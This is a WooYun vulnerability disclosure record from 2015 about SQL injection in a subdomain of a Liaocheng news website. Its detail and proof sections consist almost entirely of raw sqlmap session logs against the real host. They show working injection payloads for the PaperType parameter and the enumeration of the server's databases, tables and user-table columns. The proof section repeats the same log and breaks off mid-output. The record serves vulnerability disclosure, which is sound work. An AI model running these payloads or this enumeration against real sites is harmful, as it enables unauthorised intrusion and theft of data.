{"id": 68708, "wybug_id": "wooyun-2015-0140713", "wybug_title": "聊城新闻网某站纯在sql注入", "wybug_corp": "lcxw.cn", "wybug_author": "SunnyDoll", "wybug_date": "2015-09-13 23:30", "wybug_open_date": "2015-10-29 08:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-29：\t细节向公众公开  简要描述： RT 详细说明：  \n\n\n\n\nUsage: python sqlmap [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program's version number and exit  -v VERBOSE            Verbosity level: 0-6 (default 1)  Target:    At least one of these options has to be provided to set the target(s)    -u URL, --url=URL   Target URL (e.g. \"www.target.com/vuln.php?id=1\")    -g GOOGLEDORK       Process Google dork results as target URLs  Request:    These options can be used to specify how to connect to the target URL    --data=DATA         Data string to be sent through POST    --cookie=COOKIE     HTTP Cookie header    --random-agent      Use randomly selected HTTP User-Agent header    --proxy=PROXY       Use a proxy to connect to the target URL    --tor               Use Tor anonymity network    --check-tor         Check to see if Tor is used properly  Injection:    These options can be used to specify which parameters to test for,    provide custom injection payloads and optional tampering scripts    -p TESTPARAMETER    Testable parameter(s)    --dbms=DBMS         Force back-end DBMS to this value  Detection:    These options can be used to customize the detection phase    --level=LEVEL       Level of tests to perform (1-5, default 1)    --risk=RISK         Risk of tests to perform (0-3, default 1)  Techniques:    These options can be used to tweak testing of specific SQL injection    techniques    --technique=TECH    SQL injection techniques to use (default \"BEUSTQ\")  Enumeration:    These options can be used to enumerate the back-end database    management system information, structure and data contained in the    tables. Moreover you can run your own SQL statements    -a, --all           Retrieve everything    -b, --banner        Retrieve DBMS banner    --current-user      Retrieve DBMS current user    --current-db        Retrieve DBMS current database    --passwords         Enumerate DBMS users password hashes    --tables            Enumerate DBMS database tables    --columns           Enumerate DBMS database table columns    --schema            Enumerate DBMS schema    --dump              Dump DBMS database table entries    --dump-all          Dump all DBMS databases tables entries    -D DB               DBMS database to enumerate    -T TBL              DBMS database table(s) to enumerate    -C COL              DBMS database table column(s) to enumerate  Operating system access:    These options can be used to access the back-end database management    system underlying operating system    --os-shell          Prompt for an interactive operating system shell    --os-pwn            Prompt for an OOB shell, meterpreter or VNC  General:    These options can be used to set some general working parameters    --batch             Never ask for user input, use the default behaviour    --flush-session     Flush session files for current target  Miscellaneous:    --wizard            Simple wizard interface for beginner users[!] to see full list of options run with '-hh'[*] shutting down at 13:41:44root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:41:49[13:41:49] [INFO] testing connection to the target URL[13:41:50] [INFO] testing if the target URL is stable. This can take a couple of seconds[13:41:51] [INFO] target URL is stable[13:41:51] [INFO] testing if GET parameter 'PaperType' is dynamic[13:41:51] [INFO] confirming that GET parameter 'PaperType' is dynamic[13:41:51] [INFO] GET parameter 'PaperType' is dynamic[13:41:51] [INFO] heuristics detected web page charset 'GB2312'[13:41:51] [INFO] heuristic (basic) test shows that GET parameter 'PaperType' might be injectable (possible DBMS: 'Microsoft SQL Server')[13:41:51] [INFO] testing for SQL injection on GET parameter 'PaperType'heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] [13:41:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[13:41:54] [WARNING] reflective value(s) found and filtering out[13:41:55] [INFO] GET parameter 'PaperType' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[13:41:55] [INFO] GET parameter 'PaperType' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause' injectable [13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[13:41:55] [WARNING] time-based comparison requires larger statistical model, please wait................[13:42:08] [INFO] GET parameter 'PaperType' seems to be 'Microsoft SQL Server/Sybase stacked queries' injectable [13:42:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[13:42:08] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'[13:42:10] [INFO] GET parameter 'PaperType' seems to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable [13:42:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[13:42:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[13:42:10] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[13:42:11] [INFO] target URL appears to have 9 columns in query[13:42:13] [INFO] GET parameter 'PaperType' is 'Generic UNION query (NULL) - 1 to 20 columns' injectableGET parameter 'PaperType' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection points with a total of 50 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:24] [INFO] testing Microsoft SQL Server[13:42:24] [INFO] confirming Microsoft SQL Server[13:42:25] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:25] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 19 times[13:42:25] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:25root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:27[13:42:27] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:27] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:28] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:28] [INFO] fetching database names[13:42:28] [WARNING] reflective value(s) found and filtering out[13:42:28] [INFO] the SQL query used returns 10 entries[13:42:28] [INFO] retrieved: \"epaper\"[13:42:28] [INFO] retrieved: \"kfqepaper\"[13:42:28] [INFO] retrieved: \"master\"[13:42:28] [INFO] retrieved: \"model\"[13:42:29] [INFO] retrieved: \"msdb\"[13:42:29] [INFO] retrieved: \"Northwind\"[13:42:29] [INFO] retrieved: \"pubs\"[13:42:29] [INFO] retrieved: \"tempdb\"[13:42:29] [INFO] retrieved: \"xjz_2\"[13:42:29] [INFO] retrieved: \"xjz_2\"available databases [9]:                                                       [*] epaper[*] kfqepaper[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdb[*] xjz_2[13:42:29] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:29root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:34[13:42:35] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:35] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:35] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:35] [INFO] fetching current database[13:42:35] [WARNING] reflective value(s) found and filtering outcurrent database:    'kfqepaper'[13:42:35] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:35root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --tables -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:42:46[13:42:47] [INFO] resuming back-end DBMS 'microsoft sql server' [13:42:47] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:42:47] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:42:47] [INFO] fetching tables for database: kfqepaper[13:42:47] [WARNING] reflective value(s) found and filtering out[13:42:47] [INFO] the SQL query used returns 29 entries[13:42:47] [INFO] retrieved: \"dbo.A_GROUP_FUNC\"[13:42:47] [INFO] retrieved: \"dbo.A_GROUP_TYPE\"[13:42:48] [INFO] retrieved: \"dbo.A_GROUP_USER\"[13:42:48] [INFO] retrieved: \"dbo.A_module\"[13:42:48] [INFO] retrieved: \"dbo.A_PERSON_FUNC\"[13:42:48] [INFO] retrieved: \"dbo.A_PERSON_USER\"[13:42:48] [INFO] retrieved: \"dbo.A_USER_INFO\"[13:42:48] [INFO] retrieved: \"dbo.D_Tmp\"[13:42:49] [INFO] retrieved: \"dbo.D99_CMD\"[13:42:49] [INFO] retrieved: \"dbo.dtproperties\"[13:42:49] [INFO] retrieved: \"dbo.foofoofoo\"[13:42:49] [INFO] retrieved: \"dbo.kill_kk\"[13:42:49] [INFO] retrieved: \"dbo.log\"[13:42:50] [INFO] retrieved: \"dbo.syscommand\"[13:42:50] [INFO] retrieved: \"dbo.sysconstraints\"[13:42:50] [INFO] retrieved: \"dbo.syssegments\"[13:42:50] [INFO] retrieved: \"dbo.tb_article\"[13:42:50] [INFO] retrieved: \"dbo.tb_ClassID_OnLine\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_info\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_log\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_questionList\"[13:42:51] [INFO] retrieved: \"dbo.tb_investigate_result_question\"[13:42:51] [INFO] retrieved: \"dbo.tb_onlineFile\"[13:42:52] [INFO] retrieved: \"dbo.tb_paperBuy\"[13:42:52] [INFO] retrieved: \"dbo.tb_paperBuy\"[13:42:52] [INFO] retrieved: \"dbo.tb_review\"[13:42:52] [INFO] retrieved: \"kfqshizibao.D99_Tmp\"[13:42:52] [INFO] retrieved: \"kfqshizibao.pangolin_test_table\"[13:42:53] [INFO] retrieved: \"kfqshizibao.xl\"Database: kfqepaper                                                            [29 tables]+---------------------------------+| A_GROUP_FUNC                    || A_GROUP_TYPE                    || A_GROUP_USER                    || A_PERSON_FUNC                   || A_PERSON_USER                   || A_USER_INFO                     || A_module                        || D99_CMD                         || D_Tmp                           || dtproperties                    || foofoofoo                       || kill_kk                         || log                             || syscommand                      || sysconstraints                  || syssegments                     || tb_ClassID_OnLine               || tb_article                      || tb_investigate_info             || tb_investigate_log              || tb_investigate_questionList     || tb_investigate_result_question  || tb_onlineFile                   || tb_paperBuy                     || tb_paperBuy                     || tb_review                       || kfqshizibao.D99_Tmp             || kfqshizibao.pangolin_test_table || kfqshizibao.xl                  |+---------------------------------+[13:42:53] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:42:53root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --columns -T A_GROUP_USER -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:43:57[13:43:58] [INFO] resuming back-end DBMS 'microsoft sql server' [13:43:58] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:43:59] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:43:59] [INFO] fetching columns for table 'A_GROUP_USER' in database 'kfqepaper'[13:43:59] [WARNING] reflective value(s) found and filtering out[13:43:59] [INFO] the SQL query used returns 4 entries[13:43:59] [INFO] retrieved: \"groupId\",\"int\"[13:43:59] [INFO] retrieved: \"id\",\"int\"[13:44:00] [INFO] retrieved: \"setDate\",\"datetime\"[13:44:00] [INFO] retrieved: \"userid\",\"varchar\"Database: kfqepaper                                                            Table: A_GROUP_USER[4 columns]+---------+----------+| Column  | Type     |+---------+----------+| groupId | int      || id      | int      || setDate | datetime || userid  | varchar  |+---------+----------+[13:44:00] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:44:00root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp --columns -T A_PERSON_USER -D kfqepaper    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:44:40[13:44:40] [INFO] resuming back-end DBMS 'microsoft sql server' [13:44:40] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: PaperType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: PaperType=ftp' AND 4538=4538 AND 'jiDQ'='jiDQ    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: PaperType=ftp' AND 1823=CONVERT(INT,(SELECT CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+(SELECT (CASE WHEN (1823=1823) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113))) AND 'saxJ'='saxJ    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: PaperType=-7560' UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(111)+CHAR(110)+CHAR(104)+CHAR(113)+CHAR(88)+CHAR(110)+CHAR(83)+CHAR(73)+CHAR(120)+CHAR(117)+CHAR(66)+CHAR(121)+CHAR(65)+CHAR(88)+CHAR(113)+CHAR(115)+CHAR(112)+CHAR(100)+CHAR(113),NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: PaperType=ftp'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: PaperType=ftp' AND 2824=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'Tlct'='Tlct---[13:44:40] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2000[13:44:40] [INFO] fetching columns for table 'A_PERSON_USER' in database 'kfqepaper'[13:44:41] [WARNING] reflective value(s) found and filtering out[13:44:41] [INFO] the SQL query used returns 5 entries[13:44:41] [INFO] retrieved: \"fatherid\",\"int\"[13:44:41] [INFO] retrieved: \"groupId\",\"int\"[13:44:41] [INFO] retrieved: \"id\",\"int\"[13:44:41] [INFO] retrieved: \"setDate\",\"datetime\"[13:44:42] [INFO] retrieved: \"userid\",\"varchar\"Database: kfqepaper                                                            Table: A_PERSON_USER[5 columns]+----------+----------+| Column   | Type     |+----------+----------+| fatherid | int      || groupId  | int      || id       | int      || setDate  | datetime || userid   | varchar  |+----------+----------+[13:44:42] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/kfq.lcxw.cn'[*] shutting down at 13:44:42root@root:~#\n   漏洞证明：  \n\n\n\n\nUsage: python sqlmap [options]Options:  -h, --help            Show basic help message and exit  -hh                   Show advanced help message and exit  --version             Show program's version number and exit  -v VERBOSE            Verbosity level: 0-6 (default 1)  Target:    At least one of these options has to be provided to set the target(s)    -u URL, --url=URL   Target URL (e.g. \"www.target.com/vuln.php?id=1\")    -g GOOGLEDORK       Process Google dork results as target URLs  Request:    These options can be used to specify how to connect to the target URL    --data=DATA         Data string to be sent through POST    --cookie=COOKIE     HTTP Cookie header    --random-agent      Use randomly selected HTTP User-Agent header    --proxy=PROXY       Use a proxy to connect to the target URL    --tor               Use Tor anonymity network    --check-tor         Check to see if Tor is used properly  Injection:    These options can be used to specify which parameters to test for,    provide custom injection payloads and optional tampering scripts    -p TESTPARAMETER    Testable parameter(s)    --dbms=DBMS         Force back-end DBMS to this value  Detection:    These options can be used to customize the detection phase    --level=LEVEL       Level of tests to perform (1-5, default 1)    --risk=RISK         Risk of tests to perform (0-3, default 1)  Techniques:    These options can be used to tweak testing of specific SQL injection    techniques    --technique=TECH    SQL injection techniques to use (default \"BEUSTQ\")  Enumeration:    These options can be used to enumerate the back-end database    management system information, structure and data contained in the    tables. Moreover you can run your own SQL statements    -a, --all           Retrieve everything    -b, --banner        Retrieve DBMS banner    --current-user      Retrieve DBMS current user    --current-db        Retrieve DBMS current database    --passwords         Enumerate DBMS users password hashes    --tables            Enumerate DBMS database tables    --columns           Enumerate DBMS database table columns    --schema            Enumerate DBMS schema    --dump              Dump DBMS database table entries    --dump-all          Dump all DBMS databases tables entries    -D DB               DBMS database to enumerate    -T TBL              DBMS database table(s) to enumerate    -C COL              DBMS database table column(s) to enumerate  Operating system access:    These options can be used to access the back-end database management    system underlying operating system    --os-shell          Prompt for an interactive operating system shell    --os-pwn            Prompt for an OOB shell, meterpreter or VNC  General:    These options can be used to set some general working parameters    --batch             Never ask for user input, use the default behaviour    --flush-session     Flush session files for current target  Miscellaneous:    --wizard            Simple wizard interface for beginner users[!] to see full list of options run with '-hh'[*] shutting down at 13:41:44root@root:~# sqlmap -u http://kfq.lcxw.cn/shuzibao/list.asp?PaperType=ftp    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 13:41:49[13:41:49] [INFO] testing connection to the target URL[13:41:50] [INFO] testing if the target URL is stable. This can take a couple of seconds[13:41:51] [INFO] target URL is stable[13:41:51] [INFO] testing if GET parameter 'PaperType' is dynamic[13:41:51] [INFO] confirming that GET parameter 'PaperType' is dynamic[13:41:51] [INFO] GET parameter 'PaperType' is dynamic[13:41:51] [INFO] heuristics detected web page charset 'GB2312'[13:41:51] [INFO] heuristic (basic) test shows that GET parameter 'PaperType' might be injectable (possible DBMS: 'Microsoft SQL Server')[13:41:51] [INFO] testing for SQL injection on GET parameter 'PaperType'heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] [13:41:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[13:41:54] [WARNING] reflective value(s) found and filtering out[13:41:55] [INFO] GET parameter 'PaperType' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[13:41:55] [INFO] GET parameter 'PaperType' is 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause' injectable [13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[13:41:55] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[13:41:55] [WARNING] time-based comparison requires larger statistical model, please wait................[13:42:08] [INFO] GET parameter 'PaperType' seems to be 'Microsoft SQL Server/Sybase stacked queries' injectable [13:42:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[13:42:08] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'[13:42:10] [INFO] GET parameter 'PaperType' seems to be 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' injectable [13:42:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[13:42:10] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[13:42:10] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[13:42:11] [INFO] target URL appears to have 9 columns in query[13:42:13] [INFO] GET parameter 'PaperType' is 'Generic UNION query (NULL) - 1 to 20 columns' injectableGET parameter 'PaperType' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection points with a total of 50 